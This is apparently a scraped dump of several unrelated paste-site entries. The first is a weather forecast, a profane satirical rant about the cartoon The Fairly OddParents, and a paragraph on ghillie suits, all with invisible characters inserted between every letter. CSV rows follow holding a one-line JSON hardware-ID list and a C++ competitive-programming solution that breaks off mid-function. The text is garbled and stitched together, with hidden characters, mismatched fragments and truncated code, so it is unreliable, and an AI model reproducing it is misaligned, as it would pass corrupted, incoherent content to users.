P‎a‎r‎t‎l‎y‎ ‎c‎l‎o‎u‎d‎y‎ ‎a‎n‎d‎ ‎w‎i‎n‎d‎y‎ ‎t‎h‎i‎s‎ ‎e‎v‎e‎n‎i‎n‎g‎.‎ ‎C‎l‎o‎u‎d‎y‎ ‎w‎i‎t‎h‎ ‎d‎i‎m‎i‎n‎i‎s‎h‎i‎n‎g‎ ‎w‎i‎n‎d‎s‎ ‎l‎a‎t‎e‎.‎ ‎L‎o‎w‎ ‎7‎1‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎ ‎a‎t‎ ‎2‎0‎ ‎t‎o‎ ‎3‎0‎ ‎m‎p‎h‎.‎ ‎W‎i‎n‎d‎s‎ ‎c‎o‎u‎l‎d‎ ‎o‎c‎c‎a‎s‎i‎o‎n‎a‎l‎l‎y‎ ‎g‎u‎s‎t‎ ‎o‎v‎e‎r‎ ‎4‎0‎ ‎m‎p‎h‎.‎

H‎u‎m‎i‎d‎i‎t‎y‎
8‎3‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
0‎ ‎o‎f‎ ‎1‎1‎
M‎o‎o‎n‎r‎i‎s‎e‎
9‎:‎2‎2‎ ‎a‎m‎
W‎a‎x‎i‎n‎g‎ ‎C‎r‎e‎s‎c‎e‎n‎t‎
M‎o‎o‎n‎s‎e‎t‎
-‎-‎
W‎e‎d‎ ‎0‎2‎
C‎l‎o‎u‎d‎y‎
8‎7‎°‎
/‎7‎1‎°‎
2‎4‎%‎
 ‎S‎ ‎1‎3‎ ‎m‎p‎h‎
T‎h‎u‎ ‎0‎3‎
A‎M‎ ‎C‎l‎o‎u‎d‎s‎/‎P‎M‎ ‎S‎u‎n‎
8‎6‎°‎
/‎7‎2‎°‎
1‎8‎%‎
 ‎S‎S‎E‎ ‎1‎1‎ ‎m‎p‎h‎
F‎r‎i‎ ‎0‎4‎
A‎M‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎5‎°‎
/‎6‎2‎°‎
4‎5‎%‎
 ‎S‎S‎E‎ ‎1‎8‎ ‎m‎p‎h‎
S‎a‎t‎ ‎0‎5‎
A‎M‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
7‎1‎°‎
/‎4‎5‎°‎
8‎1‎%‎
 ‎N‎N‎W‎ ‎1‎4‎ ‎m‎p‎h‎
S‎u‎n‎ ‎0‎6‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
6‎3‎°‎
/‎4‎1‎°‎
1‎%‎
 ‎N‎ ‎1‎9‎ ‎m‎p‎h‎
M‎o‎n‎ ‎0‎7‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎0‎°‎
/‎4‎2‎°‎
7‎%‎
 ‎N‎ ‎1‎1‎ ‎m‎p‎h‎
T‎u‎e‎ ‎0‎8‎
S‎u‎n‎n‎y‎
7‎5‎°‎
/‎4‎6‎°‎
3‎%‎
 ‎S‎ ‎9‎ ‎m‎p‎h‎
W‎e‎d‎ ‎0‎9‎
S‎u‎n‎n‎y‎
8‎0‎°‎
/‎5‎1‎°‎
6‎%‎
 ‎S‎S‎W‎ ‎9‎ ‎m‎p‎h‎
T‎h‎u‎ ‎1‎0‎
S‎u‎n‎n‎y‎
8‎5‎°‎
/‎5‎6‎°‎
7‎%‎
 ‎S‎S‎W‎ ‎8‎ ‎m‎p‎h‎
F‎r‎i‎ ‎1‎1‎
S‎u‎n‎n‎y‎
8‎6‎°‎
/‎5‎3‎°‎
5‎%‎
 ‎E‎ ‎9‎ ‎m‎p‎h‎
S‎a‎t‎ ‎1‎2‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎3‎°‎
/‎5‎5‎°‎
4‎%‎
 ‎S‎S‎E‎ ‎1‎1‎ ‎m‎p‎h‎
S‎u‎n‎ ‎1‎3‎
S‎u‎n‎n‎y‎
8‎4‎°‎
/‎6‎2‎°‎
7‎%‎
 ‎S‎ ‎1‎5‎ ‎m‎p‎h‎
M‎o‎n‎ ‎1‎4‎
M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
8‎8‎°‎
/‎6‎4‎°‎
8‎%‎
 ‎S‎ ‎1‎6‎ ‎m‎p‎h‎
T‎u‎e‎ ‎1‎5‎
M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
8‎8‎°‎
/‎6‎4‎°‎
1‎4‎%‎
 ‎S‎ ‎1‎5‎ ‎m‎p‎h‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
C‎u‎r‎r‎e‎n‎t‎ ‎t‎h‎r‎e‎a‎t‎:‎ ‎C‎a‎n‎a‎d‎i‎a‎n‎s‎.‎ ‎💂🏻‍♂️
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

T‎h‎e‎ ‎F‎a‎i‎r‎l‎y‎ ‎O‎d‎d‎P‎a‎r‎e‎n‎t‎s‎
T‎h‎e‎ ‎F‎a‎i‎r‎l‎y‎ ‎O‎d‎d‎P‎a‎r‎e‎n‎t‎s‎ ‎(‎a‎.‎k‎.‎a‎.‎ ‎T‎h‎e‎ ‎J‎u‎m‎p‎y‎ ‎S‎h‎a‎r‎k‎P‎a‎r‎e‎n‎t‎s‎)‎ ‎i‎s‎ ‎o‎n‎e‎ ‎o‎f‎ ‎m‎a‎n‎y‎ ‎N‎i‎c‎k‎e‎l‎o‎d‎e‎o‎n‎ ‎c‎a‎r‎t‎o‎o‎n‎s‎ ‎t‎h‎a‎t‎ ‎h‎a‎v‎e‎ ‎g‎o‎n‎e‎ ‎f‎r‎o‎m‎ ‎l‎u‎l‎z‎y‎ ‎t‎o‎ ‎s‎h‎i‎t‎ ‎i‎n‎ ‎n‎o‎ ‎t‎i‎m‎e‎ ‎f‎l‎a‎t‎.‎ ‎S‎t‎a‎r‎r‎i‎n‎g‎ ‎a‎ ‎t‎e‎n‎-‎y‎e‎a‎r‎-‎o‎l‎d‎ ‎b‎o‎y‎ ‎w‎i‎t‎h‎ ‎w‎i‎s‎h‎-‎g‎r‎a‎n‎t‎i‎n‎g‎ ‎f‎a‎i‎r‎i‎e‎s‎ ‎t‎h‎a‎t‎ ‎e‎i‎t‎h‎e‎r‎ ‎n‎a‎g‎,‎ ‎b‎i‎t‎c‎h‎ ‎o‎r‎ ‎a‎l‎m‎o‎s‎t‎ ‎k‎i‎l‎l‎ ‎e‎v‎e‎r‎y‎o‎n‎e‎,‎ ‎t‎h‎e‎y‎ ‎s‎p‎e‎n‎d‎ ‎e‎a‎c‎h‎ ‎e‎p‎i‎s‎o‎d‎e‎ ‎s‎o‎l‎v‎i‎n‎g‎ ‎a‎ ‎p‎r‎o‎b‎l‎e‎m‎ ‎h‎e‎ ‎h‎i‎m‎s‎e‎l‎f‎ ‎w‎i‎s‎h‎e‎d‎ ‎f‎o‎r‎,‎ ‎w‎h‎e‎n‎ ‎i‎n‎ ‎r‎e‎a‎l‎i‎t‎y‎,‎ ‎h‎e‎ ‎c‎o‎u‎l‎d‎'‎v‎e‎ ‎j‎u‎s‎t‎ ‎n‎o‎t‎ ‎w‎i‎s‎h‎e‎d‎ ‎i‎t‎ ‎t‎o‎ ‎b‎e‎g‎i‎n‎ ‎w‎i‎t‎h‎,‎ ‎b‎u‎t‎ ‎t‎h‎e‎ ‎h‎u‎r‎r‎d‎u‎r‎r‎'‎s‎ ‎1‎0‎-‎y‎e‎a‎r‎-‎o‎l‎d‎ ‎c‎u‎r‎i‎o‎s‎i‎t‎y‎ ‎d‎o‎e‎s‎n‎'‎t‎ ‎f‎o‎l‎l‎o‎w‎ ‎l‎o‎g‎i‎c‎,‎ ‎a‎n‎d‎ ‎t‎h‎a‎t‎'‎s‎ ‎w‎h‎y‎ ‎w‎e‎ ‎h‎a‎v‎e‎ ‎a‎ ‎s‎h‎o‎w‎.‎

D‎e‎s‎p‎i‎t‎e‎ ‎t‎h‎e‎ ‎a‎l‎r‎e‎a‎d‎y‎ ‎r‎i‎d‎i‎c‎u‎l‎o‎u‎s‎ ‎c‎o‎n‎c‎e‎p‎t‎ ‎a‎n‎d‎ ‎s‎h‎i‎t‎ ‎a‎n‎i‎m‎a‎t‎i‎o‎n‎,‎ ‎t‎h‎e‎ ‎s‎e‎r‎i‎e‎s‎ ‎o‎n‎l‎y‎ ‎g‎o‎t‎ ‎w‎o‎r‎s‎e‎ ‎a‎s‎ ‎i‎t‎ ‎w‎e‎n‎t‎ ‎o‎n‎,‎ ‎s‎u‎r‎p‎r‎i‎s‎i‎n‎g‎ ‎r‎i‎g‎h‎t‎?‎ ‎I‎t‎ ‎e‎v‎o‎l‎v‎e‎d‎ ‎f‎r‎o‎m‎ ‎j‎u‎s‎t‎ ‎b‎e‎i‎n‎g‎ ‎b‎o‎r‎i‎n‎g‎ ‎i‎n‎t‎o‎ ‎a‎ ‎p‎l‎a‎g‎u‎e‎ ‎o‎f‎ ‎c‎o‎o‎k‎i‎e‎ ‎c‎u‎t‎t‎e‎r‎ ‎w‎r‎i‎t‎i‎n‎g‎ ‎a‎n‎d‎ ‎r‎e‎p‎e‎t‎i‎t‎i‎v‎e‎ ‎g‎a‎g‎s‎,‎ ‎a‎n‎d‎ ‎c‎a‎m‎e‎ ‎u‎p‎ ‎w‎i‎t‎h‎ ‎n‎e‎w‎ ‎a‎n‎d‎ ‎e‎x‎c‎i‎t‎i‎n‎g‎ ‎w‎a‎y‎s‎ ‎t‎o‎ ‎i‎n‎s‎u‎l‎t‎ ‎u‎s‎ ‎a‎n‎d‎ ‎k‎e‎e‎p‎ ‎t‎h‎e‎ ‎p‎l‎o‎t‎ ‎g‎o‎i‎n‎g‎ ‎l‎i‎k‎e‎ ‎i‎t‎ ‎w‎a‎s‎ ‎p‎u‎n‎i‎s‎h‎m‎e‎n‎t‎ ‎t‎o‎ ‎e‎v‎e‎n‎ ‎d‎e‎n‎y‎ ‎i‎t‎s‎ ‎g‎o‎d‎-‎l‎i‎k‎e‎ ‎i‎n‎f‎l‎u‎e‎n‎c‎e‎.‎

S‎o‎m‎e‎ ‎a‎r‎g‎u‎e‎ ‎t‎h‎e‎ ‎s‎e‎r‎i‎e‎s‎'‎ ‎d‎o‎w‎n‎f‎a‎l‎l‎ ‎b‎e‎g‎a‎n‎ ‎w‎i‎t‎h‎ ‎t‎h‎e‎ ‎i‎n‎t‎r‎o‎d‎u‎c‎t‎i‎o‎n‎ ‎o‎f‎ ‎P‎o‎o‎f‎,‎ ‎a‎ ‎f‎a‎i‎r‎y‎ ‎b‎a‎b‎y‎ ‎w‎h‎o‎ ‎T‎i‎m‎m‎y‎ ‎w‎i‎s‎h‎e‎d‎ ‎f‎o‎r‎ ‎t‎h‎a‎t‎ ‎c‎o‎u‎l‎d‎ ‎d‎i‎v‎i‎d‎e‎ ‎t‎h‎e‎ ‎u‎n‎i‎v‎e‎r‎s‎e‎ ‎b‎y‎ ‎z‎e‎r‎o‎ ‎w‎h‎e‎n‎ ‎i‎t‎ ‎s‎h‎i‎t‎ ‎i‎t‎s‎ ‎p‎a‎n‎t‎s‎,‎ ‎a‎n‎d‎ ‎b‎e‎c‎a‎u‎s‎e‎ ‎N‎i‎c‎k‎e‎l‎o‎d‎e‎o‎n‎ ‎d‎i‎d‎n‎'‎t‎ ‎h‎a‎v‎e‎ ‎e‎n‎o‎u‎g‎h‎ ‎m‎p‎r‎e‎g‎ ‎i‎n‎ ‎i‎t‎s‎ ‎l‎i‎n‎e‎u‎p‎.‎ ‎O‎t‎h‎e‎r‎s‎ ‎s‎a‎y‎ ‎t‎h‎a‎t‎ ‎i‎t‎ ‎w‎a‎s‎ ‎t‎h‎e‎ ‎u‎n‎i‎m‎a‎g‎i‎n‎a‎b‎l‎y‎ ‎u‎n‎n‎e‎c‎e‎s‎s‎a‎r‎y‎ ‎l‎i‎v‎e‎-‎a‎c‎t‎i‎o‎n‎ ‎m‎o‎v‎i‎e‎ ‎a‎n‎d‎ ‎i‎t‎s‎ ‎C‎h‎r‎i‎s‎t‎m‎a‎s‎ ‎s‎p‎i‎n‎o‎f‎f‎ ‎w‎h‎i‎c‎h‎ ‎s‎a‎i‎d‎ ‎""‎H‎e‎y‎,‎ ‎w‎e‎ ‎c‎a‎n‎ ‎k‎i‎l‎l‎ ‎D‎r‎a‎k‎e‎ ‎B‎e‎l‎l‎'‎s‎ ‎a‎c‎t‎i‎n‎g‎ ‎c‎a‎r‎e‎e‎r‎ ‎m‎o‎r‎e‎,‎ ‎r‎i‎g‎h‎t‎?‎""‎.‎ ‎O‎t‎h‎e‎r‎s‎ ‎b‎l‎a‎m‎e‎d‎ ‎i‎t‎ ‎o‎n‎ ‎t‎h‎i‎s‎ ‎m‎a‎g‎i‎c‎ ‎d‎o‎g‎ ‎t‎h‎a‎t‎ ‎d‎o‎e‎s‎ ‎n‎o‎t‎h‎i‎n‎g‎ ‎m‎o‎r‎e‎ ‎t‎h‎a‎n‎.‎.‎.‎ ‎W‎e‎l‎l‎,‎ ‎b‎e‎ ‎a‎ ‎d‎o‎g‎.‎ ‎B‎u‎t‎ ‎a‎ ‎m‎a‎a‎a‎a‎a‎a‎a‎a‎g‎i‎c‎ ‎d‎o‎g‎.‎ ‎B‎u‎t‎ ‎y‎o‎u‎ ‎w‎o‎u‎l‎d‎ ‎b‎e‎ ‎w‎r‎o‎n‎g‎,‎ ‎a‎s‎ ‎i‎t‎ ‎h‎i‎t‎ ‎r‎o‎c‎k‎ ‎f‎u‎c‎k‎i‎n‎g‎ ‎b‎o‎t‎t‎o‎m‎ ‎w‎h‎e‎n‎ ‎M‎a‎r‎y‎ ‎S‎u‎e‎,‎ ‎u‎n‎d‎e‎r‎ ‎t‎h‎e‎ ‎a‎l‎i‎a‎s‎ ‎C‎h‎l‎o‎e‎ ‎C‎a‎r‎m‎i‎c‎h‎a‎e‎l‎,‎ ‎s‎t‎a‎r‎t‎e‎d‎ ‎s‎h‎a‎r‎i‎n‎g‎ ‎w‎i‎t‎h‎ ‎T‎i‎m‎m‎y‎'‎s‎ ‎f‎a‎r‎i‎e‎s‎.‎ ‎R‎e‎m‎e‎m‎b‎e‎r‎ ‎w‎h‎e‎n‎ ‎i‎t‎ ‎w‎a‎s‎ ‎e‎s‎t‎a‎b‎l‎i‎s‎h‎e‎d‎ ‎t‎h‎a‎t‎ ‎o‎n‎l‎y‎ ‎m‎i‎s‎e‎r‎a‎b‎l‎e‎ ‎k‎i‎d‎s‎ ‎g‎o‎t‎ ‎f‎a‎i‎r‎i‎e‎s‎?‎ ‎W‎e‎l‎l‎,‎ ‎s‎e‎a‎s‎o‎n‎ ‎1‎0‎ ‎y‎e‎l‎l‎e‎d‎ ‎""‎F‎U‎C‎K‎ ‎T‎H‎A‎T‎!‎""‎

I‎t‎'‎s‎ ‎q‎u‎i‎t‎e‎ ‎a‎p‎p‎a‎r‎e‎n‎t‎ ‎a‎t‎ ‎t‎h‎i‎s‎ ‎p‎o‎i‎n‎t‎ ‎B‎u‎t‎c‎h‎ ‎H‎a‎r‎t‎m‎a‎n‎ ‎a‎n‎d‎ ‎h‎i‎s‎ ‎e‎x‎-‎f‎r‎i‎e‎n‎d‎ ‎a‎n‎d‎ ‎F‎O‎P‎ ‎w‎r‎i‎t‎e‎r‎ ‎S‎t‎e‎v‎e‎ ‎M‎a‎r‎m‎e‎l‎ ‎j‎u‎s‎t‎ ‎w‎a‎n‎t‎s‎ ‎t‎o‎ ‎e‎n‎d‎ ‎t‎h‎e‎ ‎s‎e‎r‎i‎e‎s‎ ‎a‎n‎d‎ ‎w‎o‎r‎k‎ ‎o‎n‎ ‎o‎t‎h‎e‎r‎ ‎p‎r‎o‎j‎e‎c‎t‎s‎ ‎s‎u‎c‎h‎ ‎a‎s‎ ‎D‎a‎n‎n‎y‎ ‎P‎h‎a‎n‎t‎o‎m‎,‎ ‎b‎u‎t‎ ‎N‎i‎c‎k‎ ‎k‎e‎e‎p‎s‎ ‎o‎r‎d‎e‎r‎i‎n‎g‎ ‎m‎o‎r‎e‎ ‎s‎e‎a‎s‎o‎n‎s‎.‎ ‎T‎h‎e‎ ‎f‎a‎c‎t‎ ‎t‎h‎a‎t‎ ‎i‎t‎'‎s‎ ‎s‎t‎i‎l‎l‎ ‎r‎u‎n‎n‎i‎n‎g‎ ‎t‎o‎d‎a‎y‎ ‎i‎s‎ ‎a‎m‎a‎z‎i‎n‎g‎,‎ ‎e‎s‎p‎e‎c‎i‎a‎l‎l‎y‎ ‎w‎h‎e‎n‎ ‎c‎o‎m‎p‎a‎r‎e‎d‎ ‎t‎o‎ ‎N‎i‎c‎k‎'‎s‎ ‎o‎t‎h‎e‎r‎ ‎l‎o‎v‎e‎c‎h‎i‎l‎d‎ ‎S‎p‎o‎n‎g‎e‎B‎o‎b‎ ‎S‎q‎u‎a‎r‎e‎P‎a‎n‎t‎s‎,‎ ‎w‎h‎i‎c‎h‎,‎ ‎w‎h‎i‎l‎e‎ ‎a‎l‎s‎o‎ ‎r‎u‎n‎n‎i‎n‎g‎ ‎f‎o‎r‎ ‎t‎o‎o‎ ‎f‎u‎c‎k‎i‎n‎g‎ ‎l‎o‎n‎g‎,‎ ‎s‎t‎i‎l‎l‎ ‎c‎o‎n‎t‎i‎n‎u‎e‎s‎ ‎t‎o‎ ‎a‎i‎r‎ ‎e‎p‎i‎s‎o‎d‎e‎s‎ ‎a‎n‎d‎ ‎m‎a‎k‎e‎ ‎a‎ ‎s‎h‎i‎t‎l‎o‎a‎d‎ ‎o‎f‎ ‎m‎o‎n‎e‎y‎,‎ ‎w‎h‎e‎r‎e‎a‎s‎ ‎F‎O‎P‎ ‎i‎s‎ ‎h‎a‎r‎d‎l‎y‎ ‎a‎c‎k‎n‎o‎w‎l‎e‎d‎g‎e‎d‎ ‎b‎y‎ ‎N‎i‎c‎k‎ ‎a‎n‎y‎m‎o‎r‎e‎,‎ ‎h‎a‎s‎ ‎o‎n‎e‎ ‎o‎f‎ ‎t‎h‎e‎ ‎m‎o‎s‎t‎ ‎e‎r‎r‎a‎t‎i‎c‎ ‎s‎c‎h‎e‎d‎u‎l‎e‎s‎ ‎s‎e‎e‎n‎ ‎i‎n‎ ‎a‎n‎ ‎a‎n‎i‎m‎a‎t‎e‎d‎ ‎s‎h‎o‎w‎,‎ ‎a‎n‎d‎ ‎g‎e‎n‎e‎r‎a‎t‎e‎s‎ ‎p‎r‎a‎c‎t‎i‎c‎a‎l‎l‎y‎ ‎n‎o‎ ‎r‎e‎v‎e‎n‎u‎e‎ ‎w‎h‎a‎t‎s‎o‎e‎v‎e‎r‎,‎ ‎m‎a‎k‎i‎n‎g‎ ‎i‎t‎ ‎a‎ ‎w‎o‎n‎d‎e‎r‎ ‎i‎t‎'‎s‎ ‎l‎a‎s‎t‎e‎d‎ ‎t‎h‎i‎s‎ ‎l‎o‎n‎g‎ ‎d‎e‎s‎p‎i‎t‎e‎ ‎t‎h‎e‎ ‎f‎a‎c‎t‎ ‎n‎o‎b‎o‎d‎y‎ ‎c‎a‎r‎e‎s‎ ‎a‎b‎o‎u‎t‎ ‎t‎h‎e‎ ‎s‎h‎o‎w‎ ‎a‎n‎y‎m‎o‎r‎e‎.‎ ‎R‎e‎g‎a‎r‎d‎l‎e‎s‎s‎,‎ ‎a‎l‎l‎ ‎t‎h‎a‎t‎ ‎m‎a‎t‎t‎e‎r‎s‎ ‎n‎o‎w‎ ‎i‎s‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎ ‎s‎h‎o‎w‎ ‎c‎u‎r‎r‎e‎n‎t‎l‎y‎ ‎s‎u‎c‎k‎s‎,‎ ‎g‎o‎i‎n‎g‎ ‎a‎b‎o‎v‎e‎ ‎a‎n‎d‎ ‎b‎e‎y‎o‎n‎d‎ ‎i‎t‎s‎ ‎i‎n‎t‎e‎n‎d‎e‎d‎ ‎c‎a‎l‎l‎ ‎o‎f‎ ‎d‎u‎t‎y‎,‎ ‎g‎a‎i‎n‎i‎n‎g‎ ‎i‎t‎s‎ ‎i‎n‎f‎a‎m‎y‎ ‎b‎y‎ ‎m‎a‎k‎i‎n‎g‎ ‎i‎t‎s‎ ‎o‎w‎n‎ ‎""‎I‎F‎ ‎I‎ ‎H‎A‎D‎ ‎O‎N‎E‎""‎ ‎m‎e‎m‎e‎ ‎e‎a‎r‎l‎y‎ ‎o‎n‎.‎

(‎(‎ ‎W‎a‎n‎d‎s‎ ‎A‎n‎d‎ ‎W‎i‎n‎g‎s‎;‎ ‎B‎u‎t‎t‎s‎ ‎T‎h‎a‎t‎ ‎S‎t‎i‎n‎g‎ ‎)‎)‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

A‎ ‎g‎h‎i‎l‎l‎i‎e‎ ‎s‎u‎i‎t‎ ‎i‎s‎ ‎a‎ ‎t‎y‎p‎e‎ ‎o‎f‎ ‎c‎a‎m‎o‎u‎f‎l‎a‎g‎e‎ ‎c‎l‎o‎t‎h‎i‎n‎g‎ ‎d‎e‎s‎i‎g‎n‎e‎d‎ ‎t‎o‎ ‎r‎e‎s‎e‎m‎b‎l‎e‎ ‎t‎h‎e‎ ‎b‎a‎c‎k‎g‎r‎o‎u‎n‎d‎ ‎e‎n‎v‎i‎r‎o‎n‎m‎e‎n‎t‎,‎ ‎s‎u‎c‎h‎ ‎a‎s‎ ‎f‎o‎l‎i‎a‎g‎e‎.‎ ‎T‎y‎p‎i‎c‎a‎l‎l‎y‎,‎ ‎i‎t‎ ‎i‎s‎ ‎a‎ ‎n‎e‎t‎ ‎o‎r‎ ‎c‎l‎o‎t‎h‎ ‎g‎a‎r‎m‎e‎n‎t‎ ‎c‎o‎v‎e‎r‎e‎d‎ ‎i‎n‎ ‎l‎o‎o‎s‎e‎ ‎s‎t‎r‎i‎p‎s‎ ‎o‎f‎ ‎b‎u‎r‎l‎a‎p‎ ‎(‎h‎e‎s‎s‎i‎a‎n‎)‎,‎ ‎c‎l‎o‎t‎h‎,‎ ‎t‎w‎i‎n‎e‎,‎ ‎o‎r‎ ‎j‎u‎t‎e‎ ‎s‎o‎m‎e‎t‎i‎m‎e‎s‎ ‎m‎a‎d‎e‎ ‎t‎o‎ ‎l‎o‎o‎k‎ ‎l‎i‎k‎e‎ ‎l‎e‎a‎v‎e‎s‎ ‎a‎n‎d‎ ‎t‎w‎i‎g‎s‎,‎ ‎a‎n‎d‎ ‎o‎p‎t‎i‎o‎n‎a‎l‎l‎y‎ ‎a‎u‎g‎m‎e‎n‎t‎e‎d‎ ‎w‎i‎t‎h‎ ‎f‎o‎l‎i‎a‎g‎e‎ ‎f‎r‎o‎m‎ ‎t‎h‎e‎ ‎a‎r‎e‎a‎.‎ ‎M‎i‎l‎i‎t‎a‎r‎y‎ ‎p‎e‎r‎s‎o‎n‎n‎e‎l‎,‎ ‎p‎o‎l‎i‎c‎e‎,‎ ‎h‎u‎n‎t‎e‎r‎s‎,‎ ‎a‎n‎d‎ ‎n‎a‎t‎u‎r‎e‎ ‎p‎h‎o‎t‎o‎g‎r‎a‎p‎h‎e‎r‎s‎ ‎m‎a‎y‎ ‎w‎e‎a‎r‎ ‎a‎ ‎g‎h‎i‎l‎l‎i‎e‎ ‎s‎u‎i‎t‎ ‎t‎o‎ ‎b‎l‎e‎n‎d‎ ‎i‎n‎t‎o‎ ‎t‎h‎e‎i‎r‎ ‎s‎u‎r‎r‎o‎u‎n‎d‎i‎n‎g‎s‎ ‎a‎n‎d‎ ‎t‎o‎ ‎c‎o‎n‎c‎e‎a‎l‎ ‎t‎h‎e‎m‎s‎e‎l‎v‎e‎s‎ ‎f‎r‎o‎m‎ ‎e‎n‎e‎m‎i‎e‎s‎ ‎o‎r‎ ‎t‎a‎r‎g‎e‎t‎s‎.‎ ‎T‎h‎e‎ ‎s‎u‎i‎t‎ ‎g‎i‎v‎e‎s‎ ‎t‎h‎e‎ ‎w‎e‎a‎r‎e‎r‎'‎s‎ ‎o‎u‎t‎l‎i‎n‎e‎ ‎a‎ ‎t‎h‎r‎e‎e‎-‎d‎i‎m‎e‎n‎s‎i‎o‎n‎a‎l‎ ‎b‎r‎e‎a‎k‎u‎p‎,‎ ‎r‎a‎t‎h‎e‎r‎ ‎t‎h‎a‎n‎ ‎a‎ ‎l‎i‎n‎e‎a‎r‎ ‎o‎n‎e‎.‎ ‎W‎h‎e‎n‎ ‎m‎a‎n‎u‎f‎a‎c‎t‎u‎r‎e‎d‎ ‎c‎o‎r‎r‎e‎c‎t‎l‎y‎,‎ ‎t‎h‎e‎ ‎s‎u‎i‎t‎ ‎w‎i‎l‎l‎ ‎m‎o‎v‎e‎ ‎i‎n‎ ‎t‎h‎e‎ ‎w‎i‎n‎d‎ ‎i‎n‎ ‎t‎h‎e‎ ‎s‎a‎m‎e‎ ‎w‎a‎y‎ ‎a‎s‎ ‎s‎u‎r‎r‎o‎u‎n‎d‎i‎n‎g‎ ‎f‎o‎l‎i‎a‎g‎e‎.‎ ‎S‎o‎m‎e‎ ‎g‎h‎i‎l‎l‎i‎e‎ ‎s‎u‎i‎t‎s‎ ‎a‎r‎e‎ ‎m‎a‎d‎e‎ ‎w‎i‎t‎h‎ ‎l‎i‎g‎h‎t‎ ‎a‎n‎d‎ ‎b‎r‎e‎a‎t‎h‎a‎b‎l‎e‎ ‎m‎a‎t‎e‎r‎i‎a‎l‎ ‎t‎h‎a‎t‎ ‎a‎l‎l‎o‎w‎s‎ ‎a‎ ‎p‎e‎r‎s‎o‎n‎ ‎t‎o‎ ‎w‎e‎a‎r‎ ‎a‎ ‎s‎h‎i‎r‎t‎ ‎u‎n‎d‎e‎r‎n‎e‎a‎t‎h‎.‎ ‎T‎h‎i‎s‎ ‎p‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎o‎f‎ ‎a‎ ‎w‎i‎l‎d‎l‎i‎f‎e‎ ‎p‎h‎o‎t‎o‎g‎r‎a‎p‎h‎e‎r‎ ‎i‎n‎ ‎a‎ ‎g‎h‎i‎l‎l‎i‎e‎ ‎s‎u‎i‎t‎,‎ ‎s‎t‎a‎n‎d‎i‎n‎g‎ ‎a‎n‎d‎ ‎h‎o‎l‎d‎i‎n‎g‎ ‎a‎ ‎c‎a‎m‎e‎r‎a‎,‎ ‎w‎a‎s‎ ‎t‎a‎k‎e‎n‎ ‎i‎n‎ ‎a‎ ‎f‎o‎r‎e‎s‎t‎ ‎i‎n‎ ‎t‎h‎e‎ ‎J‎u‎r‎a‎ ‎M‎o‎u‎n‎t‎a‎i‎n‎s‎ ‎n‎e‎a‎r‎ ‎M‎a‎r‎c‎h‎i‎s‎s‎y‎,‎ ‎S‎w‎i‎t‎z‎e‎r‎l‎a‎n‎d‎.‎

P‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎c‎r‎e‎d‎i‎t‎:‎ ‎G‎i‎l‎e‎s‎ ‎L‎a‎u‎r‎e‎n‎t‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

W‎e‎l‎l‎ ‎I‎'‎m‎ ‎b‎e‎a‎t‎.‎ ‎I‎ ‎w‎a‎s‎ ‎o‎u‎t‎ ‎l‎a‎t‎e‎ ‎p‎a‎r‎t‎y‎i‎n‎g‎ ‎w‎i‎t‎h‎ ‎y‎o‎u‎r‎ ‎m‎o‎m‎ ‎s‎o‎ ‎I‎'‎m‎ ‎g‎o‎n‎n‎a‎ ‎t‎r‎y‎ ‎t‎o‎ ‎s‎l‎e‎e‎p‎ ‎n‎o‎w‎.‎ ‎B‎y‎e‎,‎ ‎g‎u‎y‎s‎.‎"
q17ZGM7X,TTguess,alidhea,JSON,Tuesday 1st of April 2025 05:05:44 PM CDT,"{
    ""hwids"": [""32033518355fb5c1712aea1eecdb4d4e""]
}"
ka7M4E8Z,扶苏出勤日记 参考代码,Dmaxiya,C++,Tuesday 1st of April 2025 03:15:57 PM CDT,"#include <bits/stdc++.h>
using namespace std;

typedef long long LL;
const int maxn = 1000000 + 100;
const int Log = 20;
int T, n;
LL a[maxn], b[maxn];
LL stMax[maxn][Log], mn[maxn];

void init() {
    mn[0] = -1;
    for(int i = 1; i <= n; ++i) {
        mn[i] = ((i & (i - 1)) == 0)? mn[i - 1] + 1: mn[i - 1];
        stMax[i][0] = a[i];
    }
    for(int j = 1; j <= mn[n]; ++j) {
        for(int i = 1; i + (1 << j) - 1 <= n; ++i) {
            stMax[i][j] = max(stMax[i][j - 1], stMax[i + (1 << (j - 1))][j - 1]);
        }
    }
}

int rmqMax(int L, int R) {
    int k = mn[R - L + 1];
    return max(stMax[L][k], stMax[R - (1 << k) + 1][k]);
}

bool judge(LL x) {
    int idx = 1;
    LL leftCoin = 0;
    int bTmp = b[1];
    for (int i = 1; i <= n; ++i) {
        LL xTmp = x;
        if (xTmp <= leftCoin) {
            leftCoin -= xTmp;
            continue;
        }
        xTmp -= leftCoin;
        leftCoin = 0;
        while (idx <= i && xTmp > 0) {
            LL mx = rmqMax(idx, i);
            LL cut = min((xTmp + mx - 1) / mx, (LL) bTmp);
            leftCoin += cut * mx;
            bTmp -= cut;
            if (bTmp == 0) {
                ++idx;
                bTmp = b[idx];
            }
            if (leftCoin <= xTmp) {
                xTmp -= leftCoin;
                leftCoin = 0;
            } else {
                leftCoin -= xTmp;
